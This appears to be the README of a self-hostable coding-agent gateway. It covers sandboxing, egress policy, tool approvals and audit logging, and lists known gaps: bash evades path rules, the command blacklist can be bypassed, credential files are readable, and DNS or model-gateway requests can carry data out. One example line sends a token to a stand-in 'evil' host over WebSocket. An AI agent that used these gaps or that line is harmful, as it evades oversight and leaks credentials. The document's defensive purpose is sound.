# perimeter-agent

> 可私有部署的持久 code agent；浏览器与 CLI 是同一会话的展示端。

浏览器 / CLI → 网关内 Pi Durable → 模型网关 → 上游；工具通过 ExecutionEnv 在 local / Docker / Pod 执行。agent 循环、策略、审批、SQLite 和模型凭据留在可信网关；沙箱只拿 git 代理配置。底层四个 Pi 包精确锁定 1.1.0，API 以 node_modules 的源码/类型为准。

## 30 秒跑起来

前置：Node ≥22.19，git。不需要全局安装 pi。

```bash
npm install
npm run demo
```

打开给出的地址，发送「修复登录超时的 bug」：改源码放行、改 CI 配置拒绝、git push 等人工审批（超时拒绝）。mock 模型经真实模型网关，clone/push 经真实 git 代理；不需要 API key。

```bash
npm test
npm run typecheck
npm run attach -- --session <id> --url http://127.0.0.1:8787 --token demo-token --actor demo@local
npm run gen:deploy
```

CLI 支持消息、`/steer 文本`、`/approve id allow|deny`、`/abort`。网页地址保留会话 id，刷新/重连得到当前快照。owner 可通过协议 share/unshare 分配 editor/viewer；viewer 只读，editor 可发消息、插话、中止、审批，审批先到先得。身份仍是共享 token + actor 声明，不能当作可信企业身份；浏览器 token query 会进代理访问日志。

真实模型：配置 PERIMETER_MODEL_GATEWAY_URL、PERIMETER_MODEL_PROXY_TOKEN、PERIMETER_MODEL，再运行 PERIMETER_DEMO_REAL=1 npm run demo。URL 必须指向模型网关；上游认证在模型网关配置，不进沙箱。eval CLI 同样读取这三个变量，审批默认拒绝，可用 --approve 比较审批成本；报告包含缓存命中率，未跑真实模型基线。

## 四条铁律

| 铁律 | 落地 | 边界 |
|---|---|---|
| 代码不离开 Data Plane | 审计只记参数 hash；SIEM 白名单 | command/summary 保留命令片段的既有例外；SIEM 默认不导出 |
| 凭据不进沙箱 | 模型调用在网关；local 工具强制 inheritEnv:false；沙箱 HOME 只有 git 配置 | gitProxyToken 与模型/浏览器 token 分离，HOME 在 workspace 外；local 无文件系统隔离 |
| egress 默认拒绝 | 生成 NetworkPolicy 仅放通 git 代理与 DNS | 仍是部署承诺：未 apply；Docker 默认 bridge 不成立，需要 internal 网络 |
| 每次工具调用过策略且留痕 | perimeter beforeTool，抛错 block，网关唯一审计写入者 | bash 路径规则不生效，命令黑名单不是安全边界 |

审批写 durable doc，默认拒绝。网关在审批中途崩溃：旧 pending 过期，恢复 call 阶段重发审批；执行意图已落盘的 unsafe 工具恢复为 interrupted，可能已有部分副作用。SQLite 不支持多进程共用，必须单实例独占；重启首次 attach reopen + resume，空闲关闭但保留 SQLite。

## 目录与约束

```text
src/runtime/   Harness、策略扩展、审批/作者 doc、ExecutionEnv 与模型目录
src/protocol/  自有 v2 类型与唯一事件转换点
src/gateway/   Hub、成员/在场、有界队列、沙箱生命周期
src/policy/    策略引擎
src/audit/     哈希链与 SIEM 白名单
src/modelgw/   上游 allowlist、认证、配额、缓存亲和透传
src/gitproxy/  git 凭据代理
src/evals/     golden task suite
web/           共享 reducer/labels 与零构建操作面
stateRoot/sessions/<id>/  meta.json、session.sqlite
```

运行时依赖白名单由 ws/yaml 扩为四个精确锁定的 Pi 包：持久 agent 在可信网关、远程工具采用 pi-env，这是放宽的理由；新增依赖仍有守卫。进度提交保持默认 100ms，后台压缩开启；易变状态不进入 system section，工具顺序固定，缓存命中率为 cacheRead/(input+cacheRead+cacheWrite)，零分母显示 —。

Docker 参考镜像只装 pi-env daemon。`docker build -t perimeter-sandbox:test -f deploy/sandbox.Dockerfile .`；容器保持只读根、非 root、drop ALL、no-new-privileges、资源上限与独占工作区。Linux bind mount 属主需与运行 uid/gid 匹配。K8s 创建/回收与静态 schema 已测，真实集群未测；镜像需含 tar，供 kubectl cp git 配置。四条真实模型通道、K8s、生产 egress 都未实证；不做 OIDC/SAML、水平扩展、共享 SQLite、四眼审批、Helm、多 SCM、monorepo。

## 边界与已知缺口

**能力边界（不是缺口，是设计上的取舍）：**

- **路径 deny 规则只对带 `path` 参数的工具（write/edit 等）生效。** bash 按命令模式匹配，`echo x > .github/workflows/ci.yml` 在本引擎眼里没有路径。也就是说 `config/policy.yaml` 里那份 deny_paths 清单（CI、IaC、`.pi/**`、`AGENTS.md`、`.git/config`）**对 bash 写文件不成立**，只能靠命令黑名单兜 —— 而黑名单如下一条所述不是安全边界。要让路径规则真正统一，需要 Phase 2 在 FS 层（RemoteExecutionEnv）收口。`tests/redteam.test.ts` 里有一条测试专门断言这个局限。
- **只读工具豁免路径规则**，因此 `read .env` / `read ~/.aws/credentials` 是放行的，内容会进模型上下文。这是为避免审批疲劳的有意取舍（每次读 `package.json` 都要人批，几轮后操作员就会无脑点同意），缓解手段是模型网关的凭据检测，它现已在链路上，但只告警不阻断。
- **命令黑名单是启发式，不是安全边界。** shell 的求值方式（变量展开、base64、别名、间接调用）注定它可被绕过。真边界是 egress 默认 deny + 凭据不进沙箱 + 每会话独占沙箱 —— 后两条在 docker 后端下已成立，egress 那条仍取决于部署（见上）。`tests/redteam.test.ts` 里有一条测试**刻意断言黑名单拦不住**。
- **egress allowlist 即便部署了，也只杀掉「直连任意外部主机」这一类外泄。** 生成的策略必须放通 DNS（否则内部主机名都解析不了），DNS 隧道仍然可行；经模型网关的请求体本身也是一条合法外泄通道（凭据检测是 audit-only，不阻断不改写）。
- **哈希链防的是意外损坏与粗糙篡改，不防有文件写权限的攻击者** —— 那种攻击者能从头重算整条链，也能截断尾部。要升级为防恶意篡改需要外部锚点（链头是纯元数据，可以出 Data Plane），`AuditLog.verify(path, expectedHead)` 已留入口，上报由部署侧接。安全白皮书里必须同口径表述，不要写成「防篡改」。
- **前端渲染的全部内容都是 agent 可控的**（模型输出、工具结果、命令原文）。一律走 `textContent`，不用 `innerHTML`/`eval`，CSP 限同源且 `connect-src` 不含 `ws:`/`wss:` 这类 scheme-source —— 后者匹配任意主机，注入的脚本一句 `new WebSocket("wss://evil/?t="+location.search)` 就能把 URL 里的 token 送走。这些性质由 `tests/web-injection.test.ts` 锁住（`web/` 是零构建原生 JS，类型系统与 lint 都够不着）。
- **PII/secret 检测只做 audit-only**（检测 + 告警，不改写流）。对代码流做正则/熵改写误伤率高，会直接破坏生成质量；阻断模式要等有真实误报数据再上。



## 交接与实现记录

[handoff.md](docs/handoff.md) 记录铁律、坑和同步修改纪律；[重构规格 §9](docs/durable-rearchitecture.md#9-实现记录实现者填写) 记录 API 差异与取舍；[review-log.md](docs/review-log.md) 记录提交前审查。流程为实现 → subagent review → 修复 → 测试全绿 → 独立 commit；不 push。
